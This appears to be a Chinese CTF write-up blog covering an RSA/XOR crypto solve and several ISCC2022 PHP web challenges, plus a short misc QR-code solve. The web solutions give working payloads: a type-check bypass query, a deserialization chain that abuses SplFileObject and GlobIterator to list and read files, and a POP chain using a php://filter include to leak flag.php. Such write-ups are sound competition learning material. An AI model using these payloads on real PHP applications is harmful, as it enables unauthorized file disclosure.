<h2 id="easy-real"><a href="#easy-real" class="headerlink" title="easy_real"></a>easy_real</h2><p>被格式害惨了，本来最后五分钟都算出来了，结果算出来的原始字符串里的反斜杠被转义了，盯着异或之后的字符串看半天没看出问题在哪，我哭死</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">64310413306776406422334034047152581900365687374336418863191177338901198608319</span></span><br><span class="line"><span class="comment"># q = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span></span><br><span class="line">q = <span class="number">65267138038038699886916162739434586079731613825212388229424706115289974540917</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">4197356622576696564490569060686240088884187113566430134461945130770906825187894394672841467350797015940721560434743086405821584185286177962353341322088523</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(n//p)</span></span><br><span class="line">e = <span class="number">23</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m))</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:].strip(<span class="string">&quot;L&quot;</span>)))</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">str</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:].strip(<span class="string">&quot;L&quot;</span>))).replace(<span class="string">&#x27;b\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\\\\&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>).replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> a:</span><br><span class="line">        </span><br><span class="line">        flag +=<span class="built_in">chr</span>(<span class="built_in">ord</span>(k)^i)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>


<p>改良exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">64310413306776406422334034047152581900365687374336418863191177338901198608319</span></span><br><span class="line"><span class="comment"># q = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span></span><br><span class="line">q = <span class="number">65267138038038699886916162739434586079731613825212388229424706115289974540917</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">4197356622576696564490569060686240088884187113566430134461945130770906825187894394672841467350797015940721560434743086405821584185286177962353341322088523</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(n//p)</span></span><br><span class="line">e = <span class="number">23</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line"><span class="comment"># print(long_to_bytes(m).decode())</span></span><br><span class="line">a = long_to_bytes(m).decode()</span><br><span class="line"><span class="comment"># print(a)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    e = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> a:</span><br><span class="line">        </span><br><span class="line">        flag +=<span class="built_in">chr</span>(<span class="built_in">ord</span>(k)^i)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;f&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> flag:</span><br><span class="line">            e=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> e == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h1 id="ISCC2022"><a href="#ISCC2022" class="headerlink" title="ISCC2022"></a>ISCC2022</h1><p>找自信</p>
<h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="冬奥会"><a href="#冬奥会" class="headerlink" title="冬奥会"></a>冬奥会</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$Step1</span>=False;</span><br><span class="line"><span class="variable">$Step2</span>=False;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$info</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;Information&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$info</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$info</span>))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$info</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$info</span>[<span class="string">&quot;year&quot;</span>])?<span class="keyword">die</span>(<span class="string">&quot;Sorry~&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(@<span class="variable">$info</span>[<span class="string">&quot;year&quot;</span>])&#123;</span><br><span class="line">        (<span class="variable">$info</span>[<span class="string">&quot;year&quot;</span>]=<span class="number">2022</span>)?<span class="variable">$Step1</span>=True:<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$info</span>[<span class="string">&quot;items&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$info</span>[<span class="string">&quot;items&quot;</span>][<span class="number">1</span>])OR <span class="title function_ invoke__">count</span>(<span class="variable">$info</span>[<span class="string">&quot;items&quot;</span>])!==<span class="number">3</span> ) <span class="keyword">die</span>(<span class="string">&quot;Sorry~&quot;</span>);</span><br><span class="line">        <span class="variable">$status</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;skiing&quot;</span>, <span class="variable">$info</span>[<span class="string">&quot;items&quot;</span>]);</span><br><span class="line">        <span class="variable">$status</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;Sorry~&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$info</span>[<span class="string">&quot;items&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;skiing&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;Sorry~&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$Step2</span>=True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$Step1</span> &amp;&amp; <span class="variable">$Step2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;2022flag.php&quot;</span>;<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>json解码:</p>
<blockquote>
<p>{“0”:”0”,”1”:[0,[0,1]]}</p>
</blockquote>
<p>第一部分代码都看傻了，甚至比弱类型少一个等号，反正year键值对应的有字母就行，第二部分键item对应的值也是一个数组，并且数组中第1位也是数组，并且数组中有三个元素，第三处，接着第0位为int 0<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGVpeGlhby0vcC85Nzg2NDk2Lmh0bWw=">绕过array_search</span>，这样第四部分也检测不到，成功全部绕过</p>
<blockquote>
<p>?Information&#x3D;{“year”:”2022a”,”items”:[0,[1],1]}</p>
</blockquote>
<h3 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$un0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$un1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$un2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$un3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$un4</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;un0) &amp;&amp; <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;un2))&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; <span class="title function_ invoke__">Givemeanew</span>();</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span> -&gt; un3 === <span class="string">&#x27;unserialize&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable language_">$this</span> -&gt; <span class="title function_ invoke__">yigei</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span> -&gt; <span class="title function_ invoke__">giao</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Givemeanew</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; un4 = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">un0</span>(<span class="variable language_">$this</span> -&gt; un1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">yigei</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Your output: &#x27;</span>.<span class="variable language_">$this</span>-&gt;un4;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">giao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;un2);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable language_">$this</span> -&gt; un2.<span class="string">&#x27;hint.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;flag在当前目录下以字母f开头的txt中,无法爆破出来&#x27;</span>;</span><br><span class="line"><span class="comment">// 难蚌</span></span><br></pre></td></tr></table></figure>
<p>剩下的唯一的触发点就在<code>__destruct</code>，保证un0不为空，un2为空时可以进入if语句，先调用Givemeanew方法，将un0为类名的类实例化，参数为un1，并且赋值给un4，如果un3值为unserialize进入if语句调用yigei方法将un4作为字符串返回值</p>
<p>除非empty是能绕过的，否则giao方法里的eval函数就没用</p>
<p>于是可以利用的地方就只有Givemeanew方法里面的打原生类，原生类见识的有点少，花了一点时间才查到一个GlobIterator类可以匹配查询文件，很明显就是hint想告诉我们的答案，于是简单构造一下，查出文件名（我嬲，才发现这出题人居然还是个废狗玩家），然后利用SplFileObject类读取文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">a</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;un0 = <span class="string">&#x27;SplFileObject&#x27;</span>;</span><br><span class="line"><span class="comment">// $a-&gt;un0 = &#x27;GlobIterator&#x27;;</span></span><br><span class="line"><span class="comment">// $a-&gt;un1 = &quot;./f*&quot;;</span></span><br><span class="line"><span class="variable">$a</span>-&gt;un1 = <span class="string">&#x27;fATE_gr19ande_Or0de8r.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;un3 = <span class="string">&#x27;unserialize&#x27;</span>;</span><br><span class="line"><span class="comment">// $a-&gt;un2 = &#x27;php://filter/convert.base64-encode/resource=&#x27;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>总结，还是要多了解多种可以进行文件夹操作和文件操作的原生类（差点翻车）</p>
<h3 id="Pop2022"><a href="#Pop2022" class="headerlink" title="Pop2022"></a>Pop2022</h3><p>基础pop链</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Happy New Year~ MAKE A WISH</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Road_is_Long;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/***************************pop your 2022*****************************/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;page = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span>-&gt;page;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="variable language_">$this</span>-&gt;page)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You can Not Enter 2022&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;page = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;effort = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;effort;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**********************Try to See flag.php*****************************/</span></span><br></pre></td></tr></table></figure>

<p>直接写个：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span> = <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**********************Try to See flag.php*****************************/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Road_is_Long</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;page = <span class="keyword">new</span> <span class="title class_">Road_is_Long</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;page-&gt;<span class="keyword">string</span> = <span class="keyword">new</span> <span class="title class_">Make_a_Change</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;page-&gt;<span class="keyword">string</span>-&gt;effort = <span class="keyword">new</span> <span class="title class_">Try_Work_Hard</span>();</span><br><span class="line"><span class="comment">// $a-&gt;page-&gt;string-&gt;effort-&gt;var = &quot;muhua&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$y</span> = <span class="title function_ invoke__">urlencode</span>(<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// var_dump($y);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$y</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// O%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BO%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BN%3Bs%3A6%3A%22string%22%3BO%3A13%3A%22Make_a_Change%22%3A1%3A%7Bs%3A6%3A%22effort%22%3BO%3A13%3A%22Try_Work_Hard%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure>



<h2 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h2><h3 id="单板小将苏翊鸣"><a href="#单板小将苏翊鸣" class="headerlink" title="单板小将苏翊鸣"></a>单板小将苏翊鸣</h3><p>下载解压010打开图改高度（第二排前四位是宽，后四位是高），<span class="exturl" data-url="aHR0cHM6Ly9tYXpodXJlbi5jb20vc2FvbWEv">网站</span>在线扫描二维码，<span class="exturl" data-url="aHR0cDovL3d3dy5hYjE3My5jb20vY29udmVydC91bmljb2RlX2NoaW5lc2UucGhw">在线解密</span>Unicode转中文，问中国获得多少奖牌，金银铜分别多少，直接查，15942，解压获取flag</p>
